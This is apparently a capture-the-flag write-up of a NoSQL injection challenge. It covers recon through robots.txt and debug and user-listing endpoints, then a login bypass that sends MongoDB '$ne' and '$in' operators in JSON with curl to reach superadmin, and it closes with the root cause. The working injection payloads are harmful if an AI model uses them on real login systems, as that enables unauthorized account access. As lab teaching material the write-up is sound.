

![[Pasted image 20251115202318.png]]

## 🕵️‍♂️ Recon

The landing page had almost nothing — so I checked for a `robots.txt` file:

`curl http://3.25.197.138:36909/robots.txt`

It revealed multiple disallowed paths:

`Disallow: /admin/ Disallow: /api/auth/users Disallow: /backup/ Disallow: /.env Disallow: /config/`

There were also comments pointing to dev endpoints:

`/api/auth/users - Internal user directory /api/auth/debug - Debug information /api/auth/login - Authentication endpoint /api/auth/register - User registration`

These looked like classic Node.js + MongoDB API endpoints.

---

## 🔍 Enumeration

Next, I explored `/api/auth/debug`:

`curl -s http://3.25.197.138:36909/api/auth/debug | jq .`

Output:

`{   "status": "Authentication service online",   "database": "Connected",   "version": "SecureAuth v2.1.3",   "stats": {     "total_users": 13,     "admin_users": 5,     "departments": ["it", "hr", "finance", "security", "operations", "sales", "marketing"],     "roles": ["user", "admin", "moderator", "superadmin"]   },   "endpoints": {     "login": "/api/auth/login",     "register": "/api/auth/register",     "users": "/api/auth/users",     "debug": "/api/auth/debug"   } }`

Perfect — it confirmed a working Mongo-backed authentication service.

I then checked `/api/auth/users`:

`curl -s "http://3.25.197.138:36909/api/auth/users?role=superadmin" | jq .`

This endpoint leaked internal user info:

`{   "total": 2,   "users": [     { "role": "superadmin", "department": "security", "username": "sysadmin" },     { "role": "superadmin", "department": "security", "username": "root" }   ] }`

Now I knew my targets: `sysadmin` and `root`.

---

## 💉 Exploitation (NoSQL Injection)

The `/api/auth/login` endpoint accepted JSON requests.  
So I tried a classic **NoSQL injection** by sending a MongoDB operator (`$ne`) instead of a normal value:

`curl -s -X POST "http://3.25.197.138:36909/api/auth/login" \   -H "Content-Type: application/json" \   -d '{"username":{"$ne":null},"password":{"$ne":null}}' | jq .`

Response:

`{   "success": true,   "message": "Admin access granted, but insufficient privileges for system tokens.",   "user": "admin",   "isAdmin": true,   "role": "admin",   "flag": "Access granted, but you need SUPERADMIN privileges for the flag. Try targeting: sysadmin, root" }`

🔥 Boom — that’s authentication bypass via **NoSQL Injection**.  
The payload abused MongoDB’s query parsing to skip password checks.

---

## 🚀 Privilege Escalation (Targeting Superadmin)

The server hinted I needed _superadmin privileges_ for the flag.  
So I refined the payload to target those specific usernames:

`curl -s -X POST "http://3.25.197.138:36909/api/auth/login" \   -H "Content-Type: application/json" \   -d '{"username":{"$in":["sysadmin","root"]},"password":{"$ne":null}}' | jq .`
![Pasted image 20251115184443.png](https://raw.githubusercontent.com/Akashvarunn14/H7ctf/main/assets/Pasted%20image%2020251115184443.png)

That successfully authenticated as a **superadmin** and revealed the final flag:



![Pasted image 20251115184424.png](https://raw.githubusercontent.com/Akashvarunn14/H7ctf/main/assets/Pasted%20image%2020251115184424.png)

---

## 🧠 Root Cause

The backend used MongoDB and probably called something like:

`User.findOne(req.body)`

Since MongoDB treats `$`-prefixed keys as operators, sending `{ "$ne": null }` matched _any_ document with a non-null value — bypassing the password check.

